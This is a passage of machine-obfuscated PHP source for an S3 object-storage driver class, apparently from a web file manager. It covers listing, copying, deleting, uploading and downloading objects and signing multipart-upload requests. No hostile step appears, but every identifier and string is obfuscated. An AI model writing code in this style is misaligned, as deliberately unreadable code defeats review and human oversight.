$_SERVER[Î‹ÃÂŞ„]; if (empty($Â™†¿ºş)) { return array(); } $Í™½ò· = array_keys($Â™†¿ºş); $é„öù° = array(); $û€üĞ¤± = trim($û€üĞ¤±, $Ë•ï˜¹ë[8]); foreach ($Â™†¿ºş as $ñ†‰×„Í => $Øİ®áÁ©) { $Ãë‰—ôØ = ltrim(substr(trim($ñ†‰×„Í, $Ë•ï˜¹ë[8]), strlen($û€üĞ¤±)), $Ë•ï˜¹ë[8]); if (substr($ñ†‰×„Í, -1) == $Ë•ï˜¹ë[8]) { $Ãë‰—ôØ = rtrim($Ãë‰—ôØ, $Ë•ï˜¹ë[8]) . $Ë•ï˜¹ë[8]; } $é„öù° = array_merge($é„öù°, $this->slicePath($Ãë‰—ôØ)); } $—ö™üà´ = array(); foreach (array_unique($é„öù°) as $¨ÙºôÚÚ) { $‚‡ö†¢ğ = array($Ë•ï˜¹ë[86] => $this->getPathOuter($Ë•ï˜¹ë[8] . $û€üĞ¤± . $Ë•ï˜¹ë[8] . $¨ÙºôÚÚ), $Ë•ï˜¹ë[77] => 1, $Ë•ï˜¹ë[78] => 0); if (substr($¨ÙºôÚÚ, -1) != $Ë•ï˜¹ë[8]) { $‚‡ö†¢ğ[$Ë•ï˜¹ë[77]] = 0; $ÓÅ¾şæô = $this->getPath($û€üĞ¤± . $Ë•ï˜¹ë[8] . $¨ÙºôÚÚ); if (isset($Â™†¿ºş[$ÓÅ¾şæô])) { $ª÷ŸÒ…Ë = $Â™†¿ºş[$ÓÅ¾şæô]; if (isset($ª÷ŸÒ…Ë[$Ë•ï˜¹ë[78]])) { $‚‡ö†¢ğ[$Ë•ï˜¹ë[78]] = intval($ª÷ŸÒ…Ë[$Ë•ï˜¹ë[78]]); } if (isset($ª÷ŸÒ…Ë[$Ë•ï˜¹ë[196]])) { $‚‡ö†¢ğ[$Ë•ï˜¹ë[87]] = intval($ª÷ŸÒ…Ë[$Ë•ï˜¹ë[196]]); } } } $—ö™üà´[] = $‚‡ö†¢ğ; } return $—ö™üà´; } public function slicePath($ó‚è—óÜ) { $¥ß¤™ğÂ =& $_SERVER[Î‹ÃÂŞ„]; $àµ¡«¶ = explode($¥ß¤™ğÂ[8], trim($ó‚è—óÜ, $¥ß¤™ğÂ[8])); $ÛµÄç«ß = 0; do { ++$ÛµÄç«ß; $ñ­· „è[] = implode($¥ß¤™ğÂ[8], array_slice($àµ¡«¶, 0, $ÛµÄç«ß)) . $¥ß¤™ğÂ[8]; } while ($ÛµÄç«ß < count($àµ¡«¶)); $ñ­· „è[count($àµ¡«¶) - 1] = $ó‚è—óÜ; return $ñ­· „è; } public function getHost() { $¶æøÂô =& $_SERVER[Î‹ÃÂŞ„]; $©ñá¥Ã· = parse_url(trim($this->domain, $¶æøÂô[8])); $Õ²•ÈÓ¬ = isset($©ñá¥Ã·[$¶æøÂô[197]]) ? $©ñá¥Ã·[$¶æøÂô[197]] : http_type(); $‚ŒÉç”É = isset($©ñá¥Ã·[$¶æøÂô[198]]) ? $©ñá¥Ã·[$¶æøÂô[198]] : $©ñá¥Ã·[$¶æøÂô[86]]; if (isset($©ñá¥Ã·[$¶æøÂô[199]])) { $‚ŒÉç”É .= $¶æøÂô[4] . $©ñá¥Ã·[$¶æøÂô[199]]; } return $Õ²•ÈÓ¬ . $¶æøÂô[200] . $‚ŒÉç”É; } public function pathEncode($ÀÓÜÚÖ¬) { $¨¤öÕ°Ó =& $_SERVER[Î‹ÃÂŞ„]; return str_replace($¨¤öÕ°Ó[201], $¨¤öÕ°Ó[8], rawurlencode($ÀÓÜÚÖ¬)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÙûÏ¢‰) { set_timeout(); require_once SDK_DIR . $_SERVER[Î‹ÃÂŞ„][202]; parent::__construct(); $this->_init($ÙûÏ¢‰); } public function _init($ıì€Ê¢¼) { $this->config = $ıì€Ê¢¼; foreach ($ıì€Ê¢¼ as $òú–ıäÜ => $À»Ì±ˆÎ) { if (isset($this->{$òú–ıäÜ})) { $this->{$òú–ıäÜ} = $À»Ì±ˆÎ; } } $this->endpoint = $ıì€Ê¢¼[$_SERVER[Î‹ÃÂŞ„][203]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Ñ­êë­¯ = "\166\x34") { $this->signVer = $Ñ­êë­¯; $this->client->setSignatureVersion($Ñ­êë­¯); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $´ü¹©ä¹ =& $_SERVER[Î‹ÃÂŞ„]; $©Èâ‹¬ù = $this->getBucketCors(); if (!$©Èâ‹¬ù || !is_array($©Èâ‹¬ù)) { return !1; } if ($©Èâ‹¬ù[$´ü¹©ä¹[204]] != $´ü¹©ä¹[205] || $©Èâ‹¬ù[$´ü¹©ä¹[206]] != $´ü¹©ä¹[205]) { return !1; } $˜é°üì = array_map($´ü¹©ä¹[207], $©Èâ‹¬ù[$´ü¹©ä¹[208]]); if (!is_array($˜é°üì)) { $˜é°üì = array(); } $Òàõ½‰ª = array($´ü¹©ä¹[209], $´ü¹©ä¹[210], $´ü¹©ä¹[211], $´ü¹©ä¹[212], $´ü¹©ä¹[213]); $á£‚³¨™ = array_diff($Òàõ½‰ª, $˜é°üì); return empty($á£‚³¨™); } public function mkfile($×ÍÑœ‰Ø, $§œ¡š¿… = '', $Íòı™Ë = REPEAT_RENAME) { $ˆœê™Â = $this->setContent($×ÍÑœ‰Ø, $§œ¡š¿…); if ($ˆœê™Â !== !1) { return $this->getPathOuter($×ÍÑœ‰Ø); } return !1; } public function mkdir($Üğ–Ñ´‰, $ı¤Ç¾ªá = REPEAT_SKIP) { $“ï±Âß… =& $_SERVER[Î‹ÃÂŞ„]; if (empty($Üğ–Ñ´‰) && $Üğ–Ñ´‰ !== $“ï±Âß…[214]) { return !1; } if ($ı¤Ç¾ªá && $this->_isFolder($Üğ–Ñ´‰)) { return $this->getPathOuter($Üğ–Ñ´‰); } $ÖÖ„§Í‡ = $this->setContent($Üğ–Ñ´‰, $“ï±Âß…[12], !0); if ($ÖÖ„§Í‡ !== !1) { return $this->getPathOuter($Üğ–Ñ´‰); } return !1; } public function copyFile($´˜ÊñˆÁ, $òˆØ©¨©, $æñ€÷Ë³ = array()) { $¢ôà¢ÈÌ =& $_SERVER[Î‹ÃÂŞ„]; $²öÏ©´ = $this->objectMeta($´˜ÊñˆÁ); if (!$²öÏ©´) { return !1; } if ($²öÏ©´[$¢ôà¢ÈÌ[78]] <= 1024 * 1024 * 200) { $‹³¯©¦¤ = $this->client->copyObject($this->bucket, $´˜ÊñˆÁ, $this->bucket, $òˆØ©¨©, $¢ôà¢ÈÌ[215], $æñ€÷Ë³); } else { $‹³¯©¦¤ = $this->client->multiCopyObject($this->bucket, $´˜ÊñˆÁ, $this->bucket, $òˆØ©¨©, $æñ€÷Ë³); } $‹³¯©¦¤ = $‹³¯©¦¤ ? $this->getPathOuter($òˆØ©¨©) : !1; return $‹³¯©¦¤; } public function moveFile($·€²œ—, $½ÊŒÛûÙ) { if ($this->copyFile($·€²œ—, $½ÊŒÛûÙ)) { $this->delFile($·€²œ—); return $this->getPathOuter($½ÊŒÛûÙ); } return !1; } public function delFile($ÏÚ·Ê‡¾) { return $this->client->deleteObject($this->bucket, $ÏÚ·Ê‡¾); } public function delFolder($‰’ÔÄÄĞ) { $©‰¿ßô£ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->exist($‰’ÔÄÄĞ)) { return !0; } $this->listItemCache = !1; $ÒóÒÛâ» = $this->fileList($‰’ÔÄÄĞ); $this->listItemCache = !0; $¼ÑÉ•ÅØ = trim($‰’ÔÄÄĞ, $©‰¿ßô£[8]) . $©‰¿ßô£[8]; if (!empty($‰’ÔÄÄĞ) && $‰’ÔÄÄĞ !== $©‰¿ßô£[214] && !in_array($¼ÑÉ•ÅØ, $ÒóÒÛâ»[$©‰¿ßô£[84]])) { $ÒóÒÛâ»[$©‰¿ßô£[84]][] = $¼ÑÉ•ÅØ; } $³„ü  = $this->delByBatch($ÒóÒÛâ»[$©‰¿ßô£[85]]); if (!$³„ü ) { return !1; } $³„ü  = $this->delByBatch($ÒóÒÛâ»[$©‰¿ßô£[84]]); if (!$³„ü ) { return !1; } return $this->delFile($¼ÑÉ•ÅØ); } private function delByBatch($ÒØêí÷€) { foreach (array_chunk($ÒØêí÷€, 1000) as $æÒû¾‹í) { $ıÛº¥üæ = $this->client->deleteObjects($this->bucket, $æÒû¾‹í); if (!$ıÛº¥üæ) { return !1; } } return !0; } public function rename($úùÆ©Ö‘, $ºé˜íü) { return $this->renameObject($úùÆ©Ö‘, $ºé˜íü); } public function listPath($Ğ©Ê™û…, $³¬èëâ = false) { $ì¹›ù¸´ =& $_SERVER[Î‹ÃÂŞ„]; $ì—‹ÈğÇ = $this->fileList($Ğ©Ê™û…, $ì¹›ù¸´[8], !0); foreach ($ì—‹ÈğÇ[$ì¹›ù¸´[84]] as $ÚúşØ¨ª => $†…‚‰Èî) { $ì—‹ÈğÇ[$ì¹›ù¸´[84]][$ÚúşØ¨ª] = $this->folderInfo($†…‚‰Èî, $³¬èëâ, $†…‚‰Èî); } foreach ($ì—‹ÈğÇ[$ì¹›ù¸´[85]] as $ÚúşØ¨ª => $†…‚‰Èî) { $ì—‹ÈğÇ[$ì¹›ù¸´[85]][$ÚúşØ¨ª] = $this->fileInfo($†…‚‰Èî[$ì¹›ù¸´[32]], $³¬èëâ, $†…‚‰Èî); } return $ì—‹ÈğÇ; } protected function infoChildren($¯ìì’òó, &$ÍÜß‰²š) { $”¥‚á‰Ä =& $_SERVER[Î‹ÃÂŞ„]; $Ë´ı°È› = $this->fileList($¯ìì’òó, $”¥‚á‰Ä[12], !0); $ÍÜß‰²š[$”¥‚á‰Ä[80]] += count($Ë´ı°È›[$”¥‚á‰Ä[84]]); $ÍÜß‰²š[$”¥‚á‰Ä[79]] += count($Ë´ı°È›[$”¥‚á‰Ä[85]]); foreach ($Ë´ı°È›[$”¥‚á‰Ä[85]] as $ï††á§) { if (!$ï††á§ || !$ï††á§[$”¥‚á‰Ä[78]]) { continue; } $ÍÜß‰²š[$”¥‚á‰Ä[78]] += $ï††á§[$”¥‚á‰Ä[78]]; } } private function fileInfo($«ñöéÆ¯, $ıÕ„ÁÂÉ = false, $Ó¿Å×è = array()) { $ª…ıÂÊ =& $_SERVER[Î‹ÃÂŞ„]; $«ìæñúò = array($ª…ıÂÊ[32] => $this->pathThis($«ñöéÆ¯), $ª…ıÂÊ[86] => $this->getPathOuter($«ñöéÆ¯), $ª…ıÂÊ[33] => $ª…ıÂÊ[216], $ª…ıÂÊ[177] => $this->ext($«ñöéÆ¯), $ª…ıÂÊ[78] => isset($Ó¿Å×è[$ª…ıÂÊ[78]]) ? $Ó¿Å×è[$ª…ıÂÊ[78]] : 0); if ($ıÕ„ÁÂÉ) { return $«ìæñúò; } $«ìæñúò[$ª…ıÂÊ[217]] = $«ìæñúò[$ª…ıÂÊ[87]] = 0; $«ìæñúò[$ª…ıÂÊ[218]] = $«ìæñúò[$ª…ıÂÊ[219]] = !0; if (empty($Ó¿Å×è)) { $Ó¿Å×è = $this->objectMeta($«ñöéÆ¯); if (!$Ó¿Å×è) { return $«ìæñúò; } } if (isset($Ó¿Å×è[$ª…ıÂÊ[220]]) && $Ó¿Å×è[$ª…ıÂÊ[220]]) { $«ìæñúò[$ª…ıÂÊ[221]] = $Ó¿Å×è[$ª…ıÂÊ[220]]; } if (isset($Ó¿Å×è[$ª…ıÂÊ[196]])) { $«ìæñúò[$ª…ıÂÊ[87]] = $Ó¿Å×è[$ª…ıÂÊ[196]]; } if (isset($Ó¿Å×è[$ª…ıÂÊ[78]])) { $«ìæñúò[$ª…ıÂÊ[78]] = $Ó¿Å×è[$ª…ıÂÊ[78]]; } return $«ìæñúò; } private function folderInfo($ÙßÛÛ€¿, $ŒÇ’í˜ = false, $ø°á”ûß = array()) { $ÔæÍ”´Õ =& $_SERVER[Î‹ÃÂŞ„]; $‰ûÓà¸ø = array($ÔæÍ”´Õ[32] => $this->pathThis($ÙßÛÛ€¿), $ÔæÍ”´Õ[86] => $this->getPathOuter($ÔæÍ”´Õ[8] . $ÙßÛÛ€¿), $ÔæÍ”´Õ[33] => $ÔæÍ”´Õ[77]); if ($ŒÇ’í˜) { return $‰ûÓà¸ø; } $‰ûÓà¸ø[$ÔæÍ”´Õ[217]] = $‰ûÓà¸ø[$ÔæÍ”´Õ[87]] = 0; $‰ûÓà¸ø[$ÔæÍ”´Õ[218]] = $‰ûÓà¸ø[$ÔæÍ”´Õ[219]] = !0; if ($ÙßÛÛ€¿ == $ÔæÍ”´Õ[12]) { return $‰ûÓà¸ø; } if (empty($ø°á”ûß)) { $ø°á”ûß = $this->objectMeta(trim($ÙßÛÛ€¿, $ÔæÍ”´Õ[8]) . $ÔæÍ”´Õ[8]); } if (isset($ø°á”ûß[$ÔæÍ”´Õ[196]])) { $‰ûÓà¸ø[$ÔæÍ”´Õ[217]] = $ø°á”ûß[$ÔæÍ”´Õ[196]]; } return $‰ûÓà¸ø; } private function fileList($º—…˜©ì, $Â…Ü¦Ü¸ = '', $››ÇÆò = 0) { $ÉÀ¾ì÷Å =& $_SERVER[Î‹ÃÂŞ„]; $¸ßıïÁ = rtrim($º—…˜©ì, $ÉÀ¾ì÷Å[8]) . $ÉÀ¾ì÷Å[8]; $´ßäãÜ„ = $this->listObjs($¸ßıïÁ, null, null, $Â…Ü¦Ü¸); if (!$´ßäãÜ„) { return array($ÉÀ¾ì÷Å[84] => array(), $ÉÀ¾ì÷Å[85] => array()); } $€ëÓ›æ = $¨£Øé¢† = array(); foreach ($´ßäãÜ„[$ÉÀ¾ì÷Å[222]] as $¤ĞºŠ¢ğ) { $õ˜Æ‰ = $¤ĞºŠ¢ğ[$ÉÀ¾ì÷Å[32]]; if ($õ˜Æ‰ == $¸ßıïÁ) { continue; } $ÀÀÌƒÈ© = isset($¤ĞºŠ¢ğ[$ÉÀ¾ì÷Å[78]]) ? $¤ĞºŠ¢ğ[$ÉÀ¾ì÷Å[78]] : 0; $ŠÀÌ€ºŞ = $ÀÀÌƒÈ© == 0 && substr($õ˜Æ‰, strlen($õ˜Æ‰) - 1, 1) == $ÉÀ¾ì÷Å[8] ? !0 : !1; $this->cacheMethodInfoSet($õ˜Æ‰, $ŠÀÌ€ºŞ, $¤ĞºŠ¢ğ); if ($ŠÀÌ€ºŞ) { $€ëÓ›æ[] = $õ˜Æ‰; continue; } $¨£Øé¢†[] = $››ÇÆò ? $¤ĞºŠ¢ğ : $õ˜Æ‰; } foreach ($´ßäãÜ„[$ÉÀ¾ì÷Å[223]] as $¤ĞºŠ¢ğ) { $€ëÓ›æ[] = $¤ĞºŠ¢ğ[$ÉÀ¾ì÷Å[32]]; $this->cacheMethodInfoSet($¤ĞºŠ¢ğ[$ÉÀ¾ì÷Å[32]], !0); } $this->cacheMethodInfoSet($º—…˜©ì, !0); return array($ÉÀ¾ì÷Å[84] => $€ëÓ›æ, $ÉÀ¾ì÷Å[85] => $¨£Øé¢†); } private function listObjs($ÜÉşà¡, $®çì°şÆ = null, $¡ÖÅÄÊ° = null, $¬Âşš²Ø = null) { $öì›–¾Ş =& $_SERVER[Î‹ÃÂŞ„]; $ÜÉşà¡ = trim($ÜÉşà¡, $öì›–¾Ş[8]); $Ôñ›Ù³ = empty($ÜÉşà¡) && $ÜÉşà¡ !== $öì›–¾Ş[214] ? $öì›–¾Ş[12] : $ÜÉşà¡ . $öì›–¾Ş[8]; return $this->client->getBucket($this->bucket, $Ôñ›Ù³, $®çì°şÆ, $¡ÖÅÄÊ°, $¬Âşš²Ø, !0); } public function has($‘îìçñ×, $ÙÌ¨ãá = false, $¿ØÙËÊ = true) { $éÊôÚ”´ =& $_SERVER[Î‹ÃÂŞ„]; $‘îìçñ× = trim($‘îìçñ×, $éÊôÚ”´[8]); $™ÚÇğÔ = empty($‘îìçñ×) && $‘îìçñ× !== $éÊôÚ”´[214] ? $éÊôÚ”´[12] : $‘îìçñ× . $éÊôÚ”´[8]; $Ğ½«´ = null; $£õù†¡¶ = 500; $ÇÔôµùâ = $éÊôÚ”´[8]; $àÍ·¡áÏ = $°ğóÄğø = array(); while (!0) { $óÄ™£á“ = $this->listObjs($‘îìçñ×, $Ğ½«´, $£õù†¡¶, $ÇÔôµùâ); if (!$óÄ™£á“) { break; } $Ğ½«´ = $óÄ™£á“[$éÊôÚ”´[224]]; $…Ğ–Œ¢ = $óÄ™£á“[$éÊôÚ”´[222]]; $Ğ±ÅšÉ = $óÄ™£á“[$éÊôÚ”´[223]]; if (empty($…Ğ–Œ¢) && empty($Ğ±ÅšÉ)) { break; } if (count($…Ğ–Œ¢) == 1 && $…Ğ–Œ¢[0][$éÊôÚ”´[32]] == $™ÚÇğÔ) { break; } if ($ÙÌ¨ãá) { if (count($…Ğ–Œ¢)) { $…Ğ–Œ¢ = array_column($…Ğ–Œ¢, $éÊôÚ”´[32]); $àÍ·¡áÏ = array_merge($àÍ·¡áÏ, $…Ğ–Œ¢); } if (count($Ğ±ÅšÉ)) { $Ğ±ÅšÉ = array_column($Ğ±ÅšÉ, $éÊôÚ”´[32]); $°ğóÄğø = array_merge($°ğóÄğø, $Ğ±ÅšÉ); } if ($Ğ½«´ === null) { break; } continue; } if ($¿ØÙËÊ) { if (!empty($…Ğ–Œ¢)) { if (count($…Ğ–Œ¢) > 1 || isset($…Ğ–Œ¢[0][$éÊôÚ”´[32]]) && $…Ğ–Œ¢[0][$éÊôÚ”´[32]] != $™ÚÇğÔ) { return !0; } } } else { if (!empty($Ğ±ÅšÉ)) { return !0; } } if ($Ğ½«´ === null) { break; } } if ($ÙÌ¨ãá) { $àÍ·¡áÏ = array_diff($àÍ·¡áÏ, array($™ÚÇğÔ)); $àÍ·¡áÏ = count(array_unique($àÍ·¡áÏ)); $°ğóÄğø = count(array_unique($°ğóÄğø)); return array($éÊôÚ”´[225] => $àÍ·¡áÏ, $éÊôÚ”´[226] => $°ğóÄğø); } return !1; } public function listAll($™ğÀ¿ö) { $˜”şŠÌ« =& $_SERVER[Î‹ÃÂŞ„]; $€ŸÒ¼„ = $this->fileList($™ğÀ¿ö, $˜”şŠÌ«[12], !0); $ä¡Ç÷ = array_to_keyvalue($€ŸÒ¼„[$˜”şŠÌ«[85]], $˜”şŠÌ«[32]); foreach ($€ŸÒ¼„[$˜”şŠÌ«[84]] as $À–Õ•) { if (is_string($À–Õ•)) { $ä¡Ç÷[$À–Õ•] = array($˜”şŠÌ«[78] => 0); } } return $this->listAllFiles($™ğÀ¿ö, $ä¡Ç÷); } public function canRead($Ñ€•³¼) { $£Ï÷ áä =& $_SERVER[Î‹ÃÂŞ„]; $ı¢…±Ñ¤ = $this->client->getAccessControlPolicy($this->bucket, $Ñ€•³¼); if (!$ı¢…±Ñ¤) { return !1; } return in_array($ı¢…±Ñ¤, array($£Ï÷ áä[227], $£Ï÷ áä[228], $£Ï÷ áä[229])) ? !0 : !1; } public function canWrite($Èå€·Ú») { $ÓªÜœâ… =& $_SERVER[Î‹ÃÂŞ„]; $‡Á½ôË‹ = $this->client->getAccessControlPolicy($this->bucket, $Èå€·Ú»); if (!$‡Á½ôË‹) { return !1; } return in_array($‡Á½ôË‹, array($ÓªÜœâ…[227], $ÓªÜœâ…[228])) ? !0 : !1; } public function getContent($»Ğƒ†­) { return $this->client->getObject($this->bucket, $»Ğƒ†­); } public function setContent($’•ç–¤á, $èÜˆÊ¢û = '', $§¨Ç˜¹† = false) { $Ôİ¥€– =& $_SERVER[Î‹ÃÂŞ„]; $’•ç–¤á = $§¨Ç˜¹† ? trim($’•ç–¤á, $Ôİ¥€–[8]) . $Ôİ¥€–[8] : $’•ç–¤á; $øåÚÔÒê = get_file_mime(get_path_ext($’•ç–¤á)); $Şóãû¦š = $this->client->putObject($èÜˆÊ¢û, $this->bucket, $’•ç–¤á, $Ôİ¥€–[215], array(), $øåÚÔÒê); if (!$Şóãû¦š) { return !1; } if ($§¨Ç˜¹†) { return !0; } $this->cacheMethod(null, null); $Şóãû¦š = $this->copyFile($’•ç–¤á, $’•ç–¤á, array($Ôİ¥€–[230] => $Şóãû¦š[$Ôİ¥€–[220]])); return $Şóãû¦š ? !0 : !1; } public function fileSubstr($ñò„©˜â, $®£èŸö×, $ğ»¿…à) { $¾Î‘Ÿ·Ù = $®£èŸö× + $ğ»¿…à - 1; return $this->client->getObject($this->bucket, $ñò„©˜â, array($_SERVER[Î‹ÃÂŞ„][231] => "\142\x79\164\145\x73\x3d{$®£èŸö×}\x2d{$¾Î‘Ÿ·Ù}")); } public function upload($œ—ÆûÖ, $œâÁ«ïñ, $Íåîø¦¥ = false, $‡öØô£Ø = REPEAT_REPLACE) { $ı®½›Ñ… =& $_SERVER[Î‹ÃÂŞ„]; $âÄò¬´¬ = array($ı®½›Ñ…[230] => @md5_file($œâÁ«ïñ)); $¾ÓÌãÎ¬ = array($ı®½›Ñ…[232] => get_file_mime(get_path_ext($œ—ÆûÖ))); if (IO::size($œâÁ«ïñ) <= 1024 * 1024 * 200) { $ ƒ¯è¬™ = $this->client->putObjectFile($œâÁ«ïñ, $this->bucket, $œ—ÆûÖ, $ı®½›Ñ…[215], $âÄò¬´¬, $¾ÓÌãÎ¬); return !empty($ ƒ¯è¬™) ? $this->getPathOuter($œ—ÆûÖ) : !1; } $ Ö³¨–ô = $this->client->multiUploadObject($œâÁ«ïñ, $this->bucket, trim($œ—ÆûÖ, $ı®½›Ñ…[8]), $âÄò¬´¬, $¾ÓÌãÎ¬); return $ Ö³¨–ô ? $this->getPathOuter($œ—ÆûÖ) : !1; } public function download($À®‰îñ®, $•ùõ‰ÁÈ) { if (!@is_dir($this->pathFather($•ùõ‰ÁÈ)) && !IO::mkdir($this->pathFather($•ùõ‰ÁÈ))) { return !1; } $ªÏïŞÖˆ = $this->client->getObject($this->bucket, $À®‰îñ®, array(), $•ùõ‰ÁÈ); return $ªÏïŞÖˆ !== !1 ? $•ùõ‰ÁÈ : !1; } public function link($ÇşÛÇ¡·, $ÅËÉ†Ïû = array()) { $¡™“·»‡ =& $_SERVER[Î‹ÃÂŞ„]; if ($this->signVer == $¡™“·»‡[233]) { return $this->client->getAuthenticatedURL($this->bucket, $ÇşÛÇ¡·, 3600 * 12, $ÅËÉ†Ïû); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÇşÛÇ¡·, $¡™“·»‡[8]), 3600 * 12, $this->region, array(), !0, $ÅËÉ†Ïû); } public function fileOut($óĞÔ’›Ó, $­µ®ùË§ = false, $Ûß’ü† = false, $¤–ÈœÓÃ = '') { $ÏÉ·úÉë =& $_SERVER[Î‹ÃÂŞ„]; if ($this->isFileOutServer()) { return $this->fileOutServer($óĞÔ’›Ó, $­µ®ùË§, $Ûß’ü†, $¤–ÈœÓÃ); } if (!$Ûß’ü†) { $Ûß’ü† = $this->pathThis($óĞÔ’›Ó); } $Æ‚¢é” = get_file_mime(get_path_ext($Ûß’ü†)); if ($Æ‚¢é” == $ÏÉ·úÉë[234]) { return parent::fileOut($óĞÔ’›Ó, $­µ®ùË§, $Ûß’ü†, $¤–ÈœÓÃ); } $Çƒ‹Ø‰ß = array($ÏÉ·úÉë[235] => $Æ‚¢é”); if ($­µ®ùË§) { $Çƒ‹Ø‰ß[$ÏÉ·úÉë[236]] = $ÏÉ·úÉë[237] . rawurlencode($Ûß’ü†); } else { } $ÎáäôŠ› = $this->link($óĞÔ’›Ó, $Çƒ‹Ø‰ß); $this->fileOutLink($ÎáäôŠ›); } public function fileOutServer($¿Ê†µ•é, $æùüÍ¯« = false, $²Æ¤®ï¦ = false, $€Ö“›¶“ = '') { parent::fileOut($¿Ê†µ•é, $æùüÍ¯«, $²Æ¤®ï¦, $€Ö“›¶“); } public function fileOutImageServer($¼îşøà, $½‹Ú„Å = 250) { parent::fileOutImage($¼îşøà, $½‹Ú„Å); } public function hashMd5($Ÿ­‘Èú², $Ó²ö×¥Ç = '') { $ÛÎ¾öµã =& $_SERVER[Î‹ÃÂŞ„]; $öşğÅàÕ = $this->objectMeta($Ÿ­‘Èú²); if (!$öşğÅàÕ) { return !1; } $Ó²ö×¥Ç = $Ó²ö×¥Ç ? $Ó²ö×¥Ç : _get($öşğÅàÕ, $ÛÎ¾öµã[238]); $Ó²ö×¥Ç = $Ó²ö×¥Ç ? $Ó²ö×¥Ç : _get($öşğÅàÕ, $ÛÎ¾öµã[220], $ÛÎ¾öµã[12]); return $Ó²ö×¥Ç; } public function uploadFormData($›ÓĞÈê, $ØêØêÀ = 3600) { $‘ä´²Æ™ =& $_SERVER[Î‹ÃÂŞ„]; $¹ ¾Âçø = $this->pathFather($›ÓĞÈê); $‚Úø™•î = $this->client->getHttpUploadPostParams($this->bucket, $¹ ¾Âçø, $‘ä´²Æ™[215], $ØêØêÀ); return array_merge((array) $‚Úø™•î, array($‘ä´²Æ™[198] => $this->getHost())); } public function multiUploadFormData($ä˜ïŒÀğ, $‹ÀÇ«™¢ = 3600) { $ ¡ä =& $_SERVER[Î‹ÃÂŞ„]; $–‘ÊÃÜ = gmdate($ ¡ä[239]); $ëßÊ–¿Â = array(); $ıœ €ä¾ = $this->client->getUploadId($this->bucket, $ä˜ïŒÀğ, $ëßÊ–¿Â); if (!$ıœ €ä¾) { return !1; } return array($ ¡ä[240] => $ıœ €ä¾, $ ¡ä[198] => $this->getHost() . $ ¡ä[8] . $this->pathEncode($ä˜ïŒÀğ), $ ¡ä[241] => $–‘ÊÃÜ, $ ¡ä[96] => $ä˜ïŒÀğ); } public function multiUploadAuthData($ªŞ°¥©†, $“ËÖû­š = array()) { $»ñæ­³¢ =& $_SERVER[Î‹ÃÂŞ„]; $©„¥€…» = isset($“ËÖû­š[$»ñæ­³¢[241]]) ? $“ËÖû­š[$»ñæ­³¢[241]] : gmdate($»ñæ­³¢[239]); $üù™ãİ“ = isset($“ËÖû­š[$»ñæ­³¢[177]]) ? $“ËÖû­š[$»ñæ­³¢[177]] : $»ñæ­³¢[12]; $éºí•š = $“ËÖû­š[$»ñæ­³¢[96]]; unset($“ËÖû­š[$»ñæ­³¢[96]]); if (isset($“ËÖû­š[$»ñæ­³¢[242]])) { $“ËÖû­š[$»ñæ­³¢[241]] = $©„¥€…»; return $this->listUploadParts($éºí•š, $“ËÖû­š); } $•˜¾‡º = array($»ñæ­³¢[243], $»ñæ­³¢[12], $»ñæ­³¢[122], $»ñæ­³¢[12], "\x78\x2d\141\155\x7a\55\x64\x61\164\x65\x3a{$©„¥€…»}", $»ñæ­³¢[8] . $this->bucket . $»ñæ­³¢[8] . $this->pathEncode($éºí•š) . $üù™ãİ“); if (strpos($üù™ãİ“, $»ñæ­³¢[244]) === 0) { $•˜¾‡º[0] = $»ñæ­³¢[245]; } if (isset($“ËÖû­š[$»ñæ­³¢[246]]) && $“ËÖû­š[$»ñæ­³¢[246]] == $»ñæ­³¢[247]) { $•˜¾‡º[0] = $»ñæ­³¢[247]; } $­¹¶Ô  = implode($»ñæ­³¢[248], $•˜¾‡º); $ßÑ¼¥ı¨ = base64_encode(hash_hmac($»ñæ­³¢[249], $­¹¶Ô , $this->secret, !0)); $Ÿªƒ’îÔ = $»ñæ­³¢[250] . $this->accessKey . $»ñæ­³¢[4] . $ßÑ¼¥ı¨; if (strpos($üù™ãİ“, $»ñæ­³¢[244]) === 0) { return array($»ñæ­³¢[251] => $Ÿªƒ’îÔ, $»ñæ­³¢[241] => $©„¥€…»); } return $Ÿªƒ’îÔ; } public function listUploadParts($ã•ÎàÔ™, $ù÷ùÂÇÇ = array()) { $´Šõ­ñ =& $_SERVER[Î‹ÃÂŞ„]; $Ñá¢¶ÙÓ = str_replace($´Šõ­ñ[252], $´Šõ­ñ[12], $ù÷ùÂÇÇ[$´Šõ­ñ[177]]); $¼ÄÆ’·Ï = $this->client->listParts($this->bucket, $ã•ÎàÔ™, $Ñá¢¶ÙÓ); if (!$¼ÄÆ’·Ï) { return !1; } unset($ù÷ùÂÇÇ[$´Šõ­ñ[242]], $ù÷ùÂÇÇ[$´Šõ­ñ[246]]); $ù÷ùÂÇÇ[$´Šõ­ñ[96]] = $ã•ÎàÔ™; $îÀÑ¤äš = $this->multiUploadAuthData($ã•ÎàÔ™, $ù÷ùÂÇÇ); if (empty($îÀÑ¤äš)) { return !1; } return array($´Šõ­ñ[251] => $îÀÑ¤äš, $´Šõ­ñ[241] => $ù÷ùÂÇÇ[$´Šõ­ñ[241]], $´Šõ­ñ[253] => $¼ÄÆ’·Ï); } public function getHost() { return parent::getHost() . $_SERVER[Î‹ÃÂŞ„][8] . $this->bucket; } public function size($ê©ì‡) { $ÒÔêÚ‡ = $this->objectMeta($ê©ì‡); return $ÒÔêÚ‡ ? $ÒÔêÚ‡[$_SERVER[Î‹ÃÂŞ„][78]] : 0; } public function info($ã››™’Â) { if ($this->isFolder($ã››™’Â)) { return $this->folderInfo($ã››™’Â); } else { if ($this->isFile($ã››™’Â)) { return $this->fileInfo($ã››™’Â); } } return !1; } public function exist($Ú¢øİĞ‰) { return $this->isFile($Ú¢øİĞ‰) || $this->isFolder($Ú¢øİĞ‰); } public function isFile($‘¡ÀÎ¶â) { return !$this->isFolder($‘¡ÀÎ¶â) && $this->objectMeta($‘¡ÀÎ¶â); } public function isFolder($—ºò¼ã) { return 